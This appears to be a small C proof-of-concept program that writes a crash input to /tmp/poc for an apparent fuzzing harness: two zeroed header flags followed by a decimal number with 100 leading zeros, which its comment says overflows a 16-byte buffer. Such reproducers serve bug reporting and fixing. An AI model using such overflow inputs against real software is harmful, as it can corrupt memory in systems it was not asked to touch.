#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    // Write header: fuzz_flags=0, dump_flags=0
    unsigned int fuzz_flags = 0;
    unsigned int dump_flags = 0;
    fwrite(&fuzz_flags, 4, 1, f);
    fwrite(&dump_flags, 4, 1, f);
    
    // Write a number with many leading zeros after decimal point
    // "0.000...0099" with enough zeros to overflow the 16-byte buffer
    fprintf(f, "0.");
    for (int i = 0; i < 100; i++) {
        fputc('0', f);
    }
    fprintf(f, "99");
    
    fclose(f);
    return 0;
}